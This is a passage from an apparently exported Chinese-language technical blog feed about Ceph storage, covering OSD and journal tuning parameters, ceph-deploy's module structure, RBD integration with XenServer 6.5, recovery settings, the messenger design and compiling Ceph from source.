<td align="right">5000</td>
</tr>
<tr>
<td>filestore queue committing max bytes</td>
<td align="left">数据盘能够commit的最大字节数（B）</td>
<td align="right">100 &lt;&lt; 20</td>
<td align="right">1000 &lt;&lt; 20</td>
</tr>
<tr>
<td>filestore op threads</td>
<td align="left">并发文件系统操作线程数</td>
<td align="right">2</td>
<td align="right">32</td>
</tr>
<tr>
<td>filestore fd cache size</td>
<td align="left">对象文件句柄缓存大小</td>
<td align="right">128</td>
<td align="right">8192</td>
</tr>
<tr>
<td>filestore wbthrottle_xfs_bytes_start_flusher</td>
<td align="left">xfs文件系统开始执行回刷的脏数据</td>
<td align="right">41943040</td>
<td align="right">90 &lt;&lt; 20</td>
</tr>
<tr>
<td>filestore wbthrottle_xfs_bytes_hard_limit</td>
<td align="left">xfs文件系统允许的最大脏数据</td>
<td align="right">419430400</td>
<td align="right">500 &lt;&lt; 20</td>
</tr>
</tbody></table>
<h2 id="Journal"><a href="#Journal" class="headerlink" title="Journal"></a>Journal</h2><table>
<thead>
<tr>
<th>参数名</th>
<th align="left">描述</th>
<th align="right">默认值</th>
<th align="right">推荐值</th>
</tr>
</thead>
<tbody><tr>
<td>osd journal size</td>
<td align="left">OSD 日志大小（MB）</td>
<td align="right">5120</td>
<td align="right">20000</td>
</tr>
<tr>
<td>journal max write bytes</td>
<td align="left">日志一次异步io的最大字节数（B）</td>
<td align="right">10 &lt;&lt; 20</td>
<td align="right">1 &lt;&lt; 30</td>
</tr>
<tr>
<td>journal max write entries</td>
<td align="left">日志一次异步io的最大记录数</td>
<td align="right">100</td>
<td align="right">10000</td>
</tr>
</tbody></table>
<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>None</p>
<h2 id="PG"><a href="#PG" class="headerlink" title="PG"></a>PG</h2><p><code>PGs = (Total_number_of_OSD * 100) / max_replication_count</code><br>如果有15个OSD，副本数为3，根据公式计算PGs为500，最接近512，所以需要设置该pool的<code>pg_num</code>和<code>pgp_num</code>都为512</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph osd pool set &#123;pool name&#125; pg_num 512</span><br><span class="line">ceph osd pool set &#123;pool name&#125; pgp_num 512</span><br></pre></td></tr></table></figure>

<h2 id="CRUSH-Map"><a href="#CRUSH-Map" class="headerlink" title="CRUSH Map"></a>CRUSH Map</h2><p>Todo…</p>
<h2 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h2><table>
<thead>
<tr>
<th>参数名</th>
<th align="left">描述</th>
<th align="right">默认值</th>
<th align="right">推荐值</th>
</tr>
</thead>
<tbody><tr>
<td>objecter inflight ops</td>
<td align="left">客户端允许的最大未发送io请求数</td>
<td align="right">1024</td>
<td align="right">1 &lt;&lt; 20</td>
</tr>
<tr>
<td>objecter inflight op bytes</td>
<td align="left">客户端允许的最大未发送脏数据</td>
<td align="right">100 &lt;&lt; 20</td>
<td align="right">10 &lt;&lt; 30</td>
</tr>
</tbody></table>
<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><table>
<thead>
<tr>
<th>参数名</th>
<th align="left">描述</th>
<th align="right">默认值</th>
<th align="right">推荐值</th>
</tr>
</thead>
<tbody><tr>
<td>osd max write size</td>
<td align="left">OSD一次可写入的最大值（MB）</td>
<td align="right">90</td>
<td align="right">512</td>
</tr>
<tr>
<td>osd client message size</td>
<td align="left">客户端允许在内存中的最大数据（B）</td>
<td align="right">500 &lt;&lt; 20</td>
<td align="right">2 &lt;&lt; 30</td>
</tr>
<tr>
<td>osd deep scrub stride</td>
<td align="left">在Deep Scrub时允许读取的字节数（B）</td>
<td align="right">512 &lt;&lt; 10</td>
<td align="right">128 &lt;&lt; 10</td>
</tr>
<tr>
<td>osd op threads</td>
<td align="left">OSD进程操作的线程数</td>
<td align="right">2</td>
<td align="right">8</td>
</tr>
<tr>
<td>osd disk threads</td>
<td align="left">OSD恢复和Scrubbing时的线程数</td>
<td align="right">1</td>
<td align="right">4</td>
</tr>
<tr>
<td>osd map cache size</td>
<td align="left">OSD Map 的缓存（MB）</td>
<td align="right">200</td>
<td align="right">1024</td>
</tr>
<tr>
<td>ms_dispatch_throttle_bytes</td>
<td align="left">控制DispatcherQueue队列深度大小</td>
<td align="right">100 &lt;&lt; 20</td>
<td align="right">1 &lt;&lt; 30</td>
</tr>
</tbody></table>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://xiaoquqi.github.io/blog/2015/06/28/ceph-performance-optimization-summary/">Ceph性能优化总结（v.94）</a></li>
<li><a href="http://m.blog.csdn.net/article/details?id=51320138">Ceph性能优化之配置参数调优</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>config</tag>
        <tag>osd</tag>
      </tags>
  </entry>
  <entry>
    <title>Ceph-deploy 解析</title>
    <url>/2016/07/27/storage/ceph/20160727-ceph-deploy-parse/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>ceph-deploy官方认可的ceph部署工具。它不同于ansible、puppet。</p>
<h1 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h1><p><img src="/images/ceph/ceph-deploy-frame.png" alt="ceph-deploy-frame"></p>
<h1 id="各个模块"><a href="#各个模块" class="headerlink" title="各个模块"></a>各个模块</h1><h2 id="parser"><a href="#parser" class="headerlink" title="parser"></a>parser</h2><p>主命令参数解析，子命令参数解析</p>
<h2 id="cli"><a href="#cli" class="headerlink" title="cli"></a>cli</h2><p>加载子命令模块，选择调用哪个子命令执行操作</p>
<h2 id="new-子命令"><a href="#new-子命令" class="headerlink" title="new 子命令"></a>new 子命令</h2><p>创建集群，及 ceph.conf 配置文件</p>
<h2 id="install-子命令"><a href="#install-子命令" class="headerlink" title="install 子命令"></a>install 子命令</h2><p>跟据节点的不通角色（mon、mds、osd、rgw等），安装相关的软件包</p>
<h2 id="uninstall-子命令"><a href="#uninstall-子命令" class="headerlink" title="uninstall 子命令"></a>uninstall 子命令</h2><p>卸载节点的ceph软件</p>
<h2 id="purge-子命令"><a href="#purge-子命令" class="headerlink" title="purge 子命令"></a>purge 子命令</h2><p>清除ceph安装包</p>
<h2 id="purgedata子命令"><a href="#purgedata子命令" class="headerlink" title="purgedata子命令"></a>purgedata子命令</h2><p>清除ceph在该节点上产生的数据</p>
<h2 id="mon-子命令"><a href="#mon-子命令" class="headerlink" title="mon 子命令"></a>mon 子命令</h2><p>管理mon节点，添加、创建、删除等操作</p>
<h2 id="gatherkeys子命令"><a href="#gatherkeys子命令" class="headerlink" title="gatherkeys子命令"></a>gatherkeys子命令</h2><p>收集ceph中的keyring</p>
<h2 id="osd子命令"><a href="#osd子命令" class="headerlink" title="osd子命令"></a>osd子命令</h2><p>管理osd节点，准备、创建、激活等操作</p>
<h2 id="disk子命令"><a href="#disk子命令" class="headerlink" title="disk子命令"></a>disk子命令</h2><p>管理硬盘，格式化硬盘分区等操作</p>
<h2 id="mds子命令"><a href="#mds子命令" class="headerlink" title="mds子命令"></a>mds子命令</h2><p>管理mds节点，仅支持创建操作</p>
<h2 id="forgetkeys子命令"><a href="#forgetkeys子命令" class="headerlink" title="forgetkeys子命令"></a>forgetkeys子命令</h2><p>删除“mon”、“client.admin”、“bootstrap-osd”、“bootstrap-mds”、“bootstrap-rgw”的keyring文件</p>
<h2 id="config子命令"><a href="#config子命令" class="headerlink" title="config子命令"></a>config子命令</h2><p>从（往）指定的节点获取（输出）集群配置信息</p>
<h2 id="admin子命令"><a href="#admin子命令" class="headerlink" title="admin子命令"></a>admin子命令</h2><p>为指定的节点赋予admin角色</p>
<h2 id="pkg子命令"><a href="#pkg子命令" class="headerlink" title="pkg子命令"></a>pkg子命令</h2><p>包管理器，安装（卸载）指定的软件包</p>
<h2 id="calamari子命令"><a href="#calamari子命令" class="headerlink" title="calamari子命令"></a>calamari子命令</h2><p><em>略</em></p>
<h2 id="rgw子命令"><a href="#rgw子命令" class="headerlink" title="rgw子命令"></a>rgw子命令</h2><p>按配置文件中的配置启动rgw服务(建议使用CivetWeb)</p>
<h2 id="repo子命令"><a href="#repo子命令" class="headerlink" title="repo子命令"></a>repo子命令</h2><p>管理节点repo信息，添加、删除repo操作</p>
<h2 id="conf"><a href="#conf" class="headerlink" title="conf"></a>conf</h2><p>ceph.conf集群配置文件读写、解析等支持类操作</p>
<h2 id="host"><a href="#host" class="headerlink" title="host"></a>host</h2><p>按不同操作系统进行区别操作</p>
<h2 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h2><p>与系统相关的操作类库（如：连接管理、命令执行、文件操作等）</p>
<h2 id="util"><a href="#util" class="headerlink" title="util"></a>util</h2><p>支持库（如：ssh连接管理、服务管理、RPM包管理、APT包管理、日志管理等）</p>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>deployment</tag>
      </tags>
  </entry>
  <entry>
    <title>ceph J版与Xenserver6.5集成</title>
    <url>/2016/05/04/storage/ceph/20160504-jewel-xensvr6-5-integration/</url>
    <content><![CDATA[<h1 id="集成原理"><a href="#集成原理" class="headerlink" title="集成原理"></a>集成原理</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+-----------+</span><br><span class="line">|           |</span><br><span class="line">|           |</span><br><span class="line">|           |                          +-- ISCSI SR ----+</span><br><span class="line">| XenServer |         +---------+      |                |     +------------+ </span><br><span class="line">|           | ------&gt; |SR Driver| -----+-- NFS SR   ----+-----| XenCenter  |</span><br><span class="line">|           |         +---------+      |                |     +------------+ </span><br><span class="line">|           |                          +-- RBD SR   ----+</span><br><span class="line">+-----------+                           ( Fork ISCSI SR)</span><br></pre></td></tr></table></figure>
<ul>
<li>RBDSR通过KRBD映射ceph快设备（详细请见<a href="http://zhoubofsy.github.io/2016/04/27/20160427-map-rbd-kernel-without-ceph-common-md/">不使用ceph-common 进行内核映射 rbd 块设备</a>）</li>
<li>XenCenter在添加ISCSI设备界面中通过指定端口为“6789”来区别使用ISCSISR，还是使用RBDSR</li>
</ul>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="1-搭建ceph-J版集群"><a href="#1-搭建ceph-J版集群" class="headerlink" title="1. 搭建ceph J版集群"></a>1. 搭建ceph J版集群</h2><p>详细请见： </p>
<ul>
<li><a href="zhoubofsy.github.io/2016/04/29/20160429-jewel-of-ceph-deploy-test/">ceph Jewel 10.2.0 部署测试</a></li>
<li><a href="http://zhoubofsy.github.io/2016/04/15/20160415_ceph-install-deploy-config-on-rhel7-md/">在RHEL7.2平台上搭建ceph集群</a></li>
</ul>
<h2 id="2-调整ceph集群crush-tunables与XenServer内核匹配"><a href="#2-调整ceph集群crush-tunables与XenServer内核匹配" class="headerlink" title="2. 调整ceph集群crush tunables与XenServer内核匹配"></a>2. 调整ceph集群crush tunables与XenServer内核匹配</h2><p>针对XenServer6.5，需要调整crush tunables 为 bobtail</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph osd crush tunables bobtail</span><br></pre></td></tr></table></figure>

<p>查看更改</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph osd crush show-tunables</span><br></pre></td></tr></table></figure>

<h2 id="3-创建ceph-rbd块设备"><a href="#3-创建ceph-rbd块设备" class="headerlink" title="3. 创建ceph rbd块设备"></a>3. 创建ceph rbd块设备</h2><ul>
<li>为了保证快设备可映射、可快照、可克隆，必须使用format 2</li>
<li>ceph J版必须指定feature 为 layering</li>
<li>快设备名称必须使用uuid（不带“-”分隔）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uuidgen | sed &#x27;s/-//g&#x27;     # 生成无“-”分隔符的rbd名称</span><br><span class="line">rbd create --size &#123;size&#125; &#123;rbd名称&#125; --image-feature layering</span><br></pre></td></tr></table></figure>


<h2 id="4-XenServer节点安装RBDSR-patch"><a href="#4-XenServer节点安装RBDSR-patch" class="headerlink" title="4. XenServer节点安装RBDSR patch"></a>4. XenServer节点安装RBDSR patch</h2><p>详细请见：<br><a href="https://github.com/zhoubofsy/rbdsr/tree/1.0.0">RBDSR README</a></p>
<h2 id="5-使用XenCenter创建SR"><a href="#5-使用XenCenter创建SR" class="headerlink" title="5. 使用XenCenter创建SR"></a>5. 使用XenCenter创建SR</h2><p>同上</p>
<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><ul>
<li>ceph J版 开始抛弃KRBD</li>
<li>ceph J版 tunables会引发集群告警“crush map has legacy tunables (require bobtail, min is firefly)”（可忽略） </li>
<li>创建rbd快设备必须使用format 2 格式，否则不能正常映射（map）</li>
<li>ceph J版 rbd格式feature中只能包含layering，不能包含其他feature，否则不能正常映射（map）</li>
</ul>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://github.com/mstarikov/rbdsr">mstarikov&#x2F;rbdsr</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>xenserver</tag>
      </tags>
  </entry>
  <entry>
    <title>ThreadPool and WorkQueue</title>
    <url>/2015/11/20/storage/ceph/ThreadPool_and_WorkQueue/</url>
    <content><![CDATA[<h2 id="ThreadPool"><a href="#ThreadPool" class="headerlink" title="ThreadPool"></a>ThreadPool</h2><ul>
<li>轮询处理</li>
<li>定时触发</li>
</ul>
<h2 id="WorkQueue"><a href="#WorkQueue" class="headerlink" title="WorkQueue"></a>WorkQueue</h2><ul>
<li>FIFO机制</li>
<li>提供process方法供TP调用</li>
</ul>
<h2 id="ThreadPool-WorkQueue"><a href="#ThreadPool-WorkQueue" class="headerlink" title="ThreadPool &amp; WorkQueue"></a>ThreadPool &amp; WorkQueue</h2><ul>
<li>TP与WQ对应关系1:N</li>
<li>TP将便利WQs中的每个WQ的工作</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">   WorkQueue <span class="number">1</span>                       WorkQueue <span class="number">2</span>      ......          WorkQueue <span class="keyword">N</span></span><br><span class="line"></span><br><span class="line">            +---------+                         +---------+                       +---------+</span><br><span class="line">            | process |                         | process |                       | process | </span><br><span class="line">+-----------+---------+          +--------------+---------+       +---------------+---------+</span><br><span class="line">|           |                    |              |                 |               |</span><br><span class="line">|  work <span class="number">1</span>   | --+       +------- |              |                 |               |</span><br><span class="line">|           |   |       |        |              |                 |               |</span><br><span class="line">+-----------+   |       |        +--------------+                 +---------------+</span><br><span class="line">|           |   |       |        |              |                 |               |</span><br><span class="line">|  work <span class="number">2</span>   | --+-+     |   +--- |              |     ......      |               |</span><br><span class="line">|           |   | |     |   |    |              |                 |               |</span><br><span class="line">+-----------+   | |     |   |    +--------------+                 +---------------+</span><br><span class="line">|           |   | |     |   |    |              |                 |               |</span><br><span class="line">|  work <span class="number">3</span>   | --+-+-+   |   | +- |              |                 |               |</span><br><span class="line">|           |   | | |   |   | |  |              |                 |               |</span><br><span class="line">+-----------+   | | |   |   | |  +--------------+                 +---------------+</span><br><span class="line">  +-------------+ | |   |   | |</span><br><span class="line">  |      +--------+ |   |   | +-----+</span><br><span class="line">  |      |     +----+   |   |       |</span><br><span class="line">  v      v     v        v   v       v</span><br><span class="line">+------+------+------+------+------+------+-----+-----+-----+----+-----+------+-----+----+-----+</span><br><span class="line">|      |      |      |      |      |      |     |     |     |    |     |                       |   </span><br><span class="line">|  T1  |  T2  |  T3  |  T4  |  T5  |  T6  |  T7 |  T8 |  T9 | T10| T11 |         ......        |         ThreadPool</span><br><span class="line">|      |      |      |      |      |      |     |     |     |    |     |                       |   </span><br><span class="line">+------+------+------+------+------+------+-----+-----+-----+----+-----+------+-----+----+-----+   </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title>Backfill &amp; Recovery 恢复优化</title>
    <url>/2019/05/13/storage/ceph/backfill_recovery_config/</url>
    <content><![CDATA[<p>Backfill和Recovery都是用来恢复数据的，但二者的区别是Backfill是全量恢复，Recovery是增量恢复。而且在恢复过程中当出现Client访问恢复数据现象时，Backfill不会block client i&#x2F;o，但Recovery会block client i&#x2F;o。但二者如果占用带宽过大，还是会影响client i&#x2F;o的。</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Ceph Version : Jewel</p>
<h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><ul>
<li>默认情况下将Backfill和Recovery对Client I&#x2F;O的影响降到最小。</li>
<li>当需要Backfill或Recovery时，要根据集群负载动态调整。若集群负载低，可通过<code>ceph tell &#123;osd.id&#125; injectargs &quot;--config value&quot;</code>的放方式动态调整恢复速度，使其快速完成恢复操作。</li>
<li>当恢复完成后，再次将Backfill和Recovery调整回默认值，以降低对Client I&#x2F;O的影响。</li>
</ul>
<h2 id="Recovery-参数说明"><a href="#Recovery-参数说明" class="headerlink" title="Recovery 参数说明"></a>Recovery 参数说明</h2><table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
<th align="center">默认值</th>
</tr>
</thead>
<tbody><tr>
<td align="left">osd recovery max active</td>
<td align="left">每个 OSD 一次处理的活跃恢复请求数量，增大此值能加速恢复，但它们会增加集群负载。</td>
<td align="center">15</td>
</tr>
<tr>
<td align="left">osd recovery max chunk</td>
<td align="left">一次推送的数据块的最大尺寸。</td>
<td align="center">8 &lt;&lt; 20</td>
</tr>
<tr>
<td align="left">osd recovery threads</td>
<td align="left">数据恢复时的线程数。</td>
<td align="center">1</td>
</tr>
<tr>
<td align="left">osd recovery thread timeout</td>
<td align="left">恢复线程最大死亡时值。</td>
<td align="center">30</td>
</tr>
</tbody></table>
<h2 id="Backfill-参数说明"><a href="#Backfill-参数说明" class="headerlink" title="Backfill 参数说明"></a>Backfill 参数说明</h2><table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
<th align="center">默认值</th>
</tr>
</thead>
<tbody><tr>
<td align="left">osd max backfills</td>
<td align="left">单个 OSD 允许的最大回填操作数。</td>
<td align="center">1</td>
</tr>
<tr>
<td align="left">osd backfill full ratio</td>
<td align="left">OSD 的占满率达到多少时拒绝接受回填请求</td>
<td align="center">0.85</td>
</tr>
<tr>
<td align="left">osd backfill retry interval</td>
<td align="left">重试回填请求前等待秒数</td>
<td align="center">10.0</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>SimpleMessenger分析</title>
    <url>/2016/07/17/storage/ceph/20160617-ceph-messenger-simple/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>SimpleMessenger，继承了Messenger类，用于实现各个模块间传输命令及数据。</p>
<h1 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h1><p><img src="/images/ceph/ceph-messenger-simple-frame.png" alt="ceph-messenger-simple-frame"></p>
<h1 id="通讯协议"><a href="#通讯协议" class="headerlink" title="通讯协议"></a>通讯协议</h1><h1 id="子模块"><a href="#子模块" class="headerlink" title="子模块"></a>子模块</h1><ul>
<li>Pipes模块<br>用于管理tcp网络链接，负责接受、发送数据。</li>
<li>Accepter模块<br>仅用于接受外部请求链接，而不接收数据。将接收到的链接保存到Pipes模块中，然后由Pipes模块去收发数据。</li>
<li>DispatchQueue模块<br>接收外部发送来的数据和命令，然后通过“dispatcher”或“fast dispatcher”模块，将数据和命令传送给各个dispatcher</li>
<li>dispatcher模块<br>用于管理dispatchers，如OSD，MON，MDS等等各种需要通讯的client。</li>
<li>fast dispatcher模块<br>用于管理 fast dispatchers</li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>message</tag>
      </tags>
  </entry>
  <entry>
    <title>Ceph 编译</title>
    <url>/2018/04/02/storage/ceph/ceph-compile/</url>
    <content><![CDATA[<h1 id="Nautilus"><a href="#Nautilus" class="headerlink" title="Nautilus"></a>Nautilus</h1><h2 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h2><h3 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h3><p>采用KVM虚拟机编译Ceph源码，具体配置如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">lscpu</span></span><br><span class="line">Architecture:          x86_64</span><br><span class="line">CPU op-mode(s):        32-bit, 64-bit</span><br><span class="line">Byte Order:            Little Endian</span><br><span class="line">CPU(s):                8</span><br><span class="line">On-line CPU(s) list:   0-7</span><br><span class="line">Thread(s) per core:    1</span><br><span class="line">Core(s) per socket:    1</span><br><span class="line">Socket(s):             8</span><br><span class="line">NUMA node(s):          1</span><br><span class="line">Vendor ID:             GenuineIntel</span><br><span class="line">CPU family:            6</span><br><span class="line">Model:                 13</span><br><span class="line">Model name:            QEMU Virtual CPU version 2.5+</span><br><span class="line">Stepping:              3</span><br><span class="line">CPU MHz:               2394.454</span><br><span class="line">BogoMIPS:              4788.90</span><br><span class="line">Hypervisor vendor:     KVM</span><br><span class="line">Virtualization type:   full</span><br><span class="line">L1d cache:             32K</span><br><span class="line">L1i cache:             32K</span><br><span class="line">L2 cache:              4096K</span><br><span class="line">NUMA node0 CPU(s):     0-7</span><br><span class="line">Flags:                 fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pse36 clflush mmx fxsr sse sse2 syscall nx lm rep_good nopl cpuid tsc_known_freq pni cx16 x2apic hypervisor lahf_lm pti</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">free -g</span></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:             15           7           5           0           2           7</span><br><span class="line">Swap:             0           0           0</span><br></pre></td></tr></table></figure>

<h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><p>OS:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.6.1810 (Core)</span><br></pre></td></tr></table></figure>

<p>kernel:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">uname</span> -a</span></span><br><span class="line">Linux host-10-100-13-111 4.18.20 #1 SMP Tue Sep 17 11:21:39 CST 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p>gcc:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gcc -v</span></span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/opt/rh/devtoolset-7/root/usr/libexec/gcc/x86_64-redhat-linux/7/lto-wrapper</span><br><span class="line">Target: x86_64-redhat-linux</span><br><span class="line">Configured with: ../configure --enable-bootstrap --enable-languages=c,c++,fortran,lto --prefix=/opt/rh/devtoolset-7/root/usr --mandir=/opt/rh/devtoolset-7/root/usr/share/man --infodir=/opt/rh/devtoolset-7/root/usr/share/info --with-bugurl=http://bugzilla.redhat.com/bugzilla --enable-shared --enable-threads=posix --enable-checking=release --enable-multilib --with-system-zlib --enable-__cxa_atexit --disable-libunwind-exceptions --enable-gnu-unique-object --enable-linker-build-id --with-gcc-major-version-only --enable-plugin --with-linker-hash-style=gnu --enable-initfini-array --with-default-libstdcxx-abi=gcc4-compatible --with-isl=/builddir/build/BUILD/gcc-7.3.1-20180303/obj-x86_64-redhat-linux/isl-install --enable-libmpx --enable-gnu-indirect-function --with-tune=generic --with-arch_32=i686 --build=x86_64-redhat-linux</span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version 7.3.1 20180303 (Red Hat 7.3.1-5) (GCC)</span><br></pre></td></tr></table></figure>

<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><h3 id="pre-compile"><a href="#pre-compile" class="headerlink" title="pre-compile"></a>pre-compile</h3><p>执行<code>install-deps.sh</code>，安装编译ceph依赖的软件包。</p>
<h3 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h3><p>安装官方文档的步骤可以正常编译，但默认的编译是含有调试信息的。所以编译后的bin文件比较大。</p>
<ol>
<li>生成makefile文件<br> 使用<code>do_cmake.sh</code>脚本在<code>build</code>目录下生成<code>Makefile</code>文件</li>
<li>编译<br> 使用<code>make</code>命令编译，此过程时间较长。</li>
<li>瘦身<br> 编译后的binary文件包含有debug信息，所以文件较大。需要使用strip对其debug信息进行裁剪。裁剪有两个工具可以用一个是<code>objcopy</code>；另一个是<code>strip</code><br> eg:<br> <code>objcopy --strip-debug ./radosgw</code><br> <code>strip --strip-debug --strip-unneeded ./radosgw</code></li>
</ol>
<h3 id="rpmbuild"><a href="#rpmbuild" class="headerlink" title="rpmbuild"></a>rpmbuild</h3><ol>
<li>生成<code>rpmbuild</code>目录树<br> 使用<code>rpmdev-setuptree</code>命令创建<code>rpmbuild</code>目录树，该目录树会在<code>$home</code>目录下生成。可根据自己的需要将<code>rpmbuild</code>copy到指定的目录，但后续build过程需要指定这个目录。本人将<code>rpmbuild</code>目录移动到<code>/root/src</code>目录下。</li>
<li>获取源码tar包到<code>rpmbuild/SOURCES</code>目录<br> 获取源码tar包可以到<code>https://download.ceph.com/tarballs/ceph-14.2.3.tar.gz</code>去下载。也可以将修改好的代码直接做成tar包。然后将tar包copy到<code>rpmbuild/SOURCES</code>目录下。</li>
<li>提取tar包中的<code>ceph.spec</code><br> 从源码tar包中提取<code>ceph.spec</code>文件到<code>rpmbuild/SPECS</code>目录，用于后续rpmbuild使用。eg: <code>tar --strip-components=1 -C /root/src/rpmbuild/SPECS/ --no-anchored -xvzf /root/src/rpmbuild/SOURCES/ceph-14.2.3.tar.gz &quot;ceph.spec&quot;</code></li>
<li>build rpms<br> rpmbuild具体使用<code>-bb</code>还是<code>-ba</code>根据个人需要而定吧。本人这里使用<code>-bb</code>只制作binary。eg: <code>rpmbuild -D &quot;_smp_mflags 4&quot; -D &quot;_topdir /root/src/rpmbuild&quot; -bb /root/src/rpmbuild/SPECS/ceph.spec</code>。<br> 由于本人将<code>rpmbuild</code>移动到了<code>/root/src</code>目录下，所以需要使用<code>-D &quot;_topdir /root/src/rpmbuild&quot;</code>去指定<code>rpmbuild</code>目录。<br> 本人不希望rpmbuild自动推算使用几个核心去编译，需要指定4个核心编译需要指定<code>-D &quot;_smp_mflags 4&quot;</code></li>
</ol>
<p>此时，可以静静等待编译完成。</p>
<p>*** 编译的过程中可能会遇到<code>BuildArch:noarch</code>错误 ***</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">error: Arch dependent binaries in noarch package</span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line">RPM build errors:</span><br><span class="line">    Arch dependent binaries in noarch package</span><br></pre></td></tr></table></figure>

<p>可以通过在<code>spec</code>文件中增加<code>%define _binaries_in_noarch_packages_terminate_build 0</code>来解决此问题。</p>
<h1 id="Luminous"><a href="#Luminous" class="headerlink" title="Luminous"></a>Luminous</h1><p>编译 Ceph luminous版本，luminous的改动还是蛮大的，而且改变了原有的configure为cmake。</p>
<h2 id="编译环境-1"><a href="#编译环境-1" class="headerlink" title="编译环境"></a>编译环境</h2><h3 id="硬件-1"><a href="#硬件-1" class="headerlink" title="硬件"></a>硬件</h3><p>armv7l (Odroid XU4)</p>
<h3 id="软件-1"><a href="#软件-1" class="headerlink" title="软件"></a>软件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">lsb_release  -a</span></span><br><span class="line">LSB Version:    1.4</span><br><span class="line">Distributor ID: Arch</span><br><span class="line">Description:    Arch Linux</span><br><span class="line">Release:        rolling</span><br><span class="line">Codename:       n/a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">uname</span> -a</span></span><br><span class="line">Linux HomeCenter 4.14.29-1-ARCH #1 SMP PREEMPT Fri Mar 23 02:57:06 UTC 2018 armv7l GNU/Linux</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -v</span></span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/usr/lib/gcc/armv7l-unknown-linux-gnueabihf/7.2.1/lto-wrapper</span><br><span class="line">Target: armv7l-unknown-linux-gnueabihf</span><br><span class="line">Configured with: /build/gcc/src/gcc/configure --prefix=/usr --libdir=/usr/lib --libexecdir=/usr/lib --mandir=/usr/share/man --infodir=/usr/share/info --with-bugurl=https://github.com/archlinuxarm/PKGBUILDs/issues --enable-languages=c,c++,fortran,go,lto,objc,obj-c++ --enable-shared --enable-threads=posix --with-system-zlib --with-isl --enable-__cxa_atexit --disable-libunwind-exceptions --enable-clocale=gnu --disable-libstdcxx-pch --disable-libssp --enable-gnu-unique-object --enable-linker-build-id --enable-lto --enable-plugin --enable-install-libiberty --with-linker-hash-style=gnu --enable-gnu-indirect-function --disable-multilib --disable-werror --enable-checking=release --enable-default-pie --enable-default-ssp --host=armv7l-unknown-linux-gnueabihf --build=armv7l-unknown-linux-gnueabihf 